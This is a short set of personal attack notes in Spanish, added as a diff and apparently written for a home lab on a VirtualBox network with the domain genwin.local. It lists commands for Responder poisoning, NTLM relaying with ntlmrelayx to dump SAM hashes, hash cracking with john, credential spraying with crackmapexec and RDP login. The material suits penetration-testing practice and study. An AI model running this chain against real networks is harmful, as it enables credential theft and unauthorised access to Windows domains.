@@ -1,0 +1,15 @@
+User.txt
+
+
+nano /etc/responder/responder.conf -> Smb y http a Off -> Acordarse de ponerlo luego en On para otros ataques.
+crackmapexec smb 192.168.56.0/24 -> para saber ips y guardarlas en .txt y dominio
+sudo responder -I vboxnet0 -dw
+ntlmrelayx.py -tf ips.txt -smb2support
+y espero a k acceda a un recurson compartido inexistente para obtener la SAM 
+john hash --format=NT --show
+john -w pass.txt hash --format=NT
+
+verificar credenciales:
+crackmapexec smb 192.168.56.0/24 -u "name" -p "pass"
+
+rdesktop -u 'user@domain' -p 'pass' IP -> El domain es genwin.local, lo sabemos porque lo hemos visto en el comando crackmapexec.
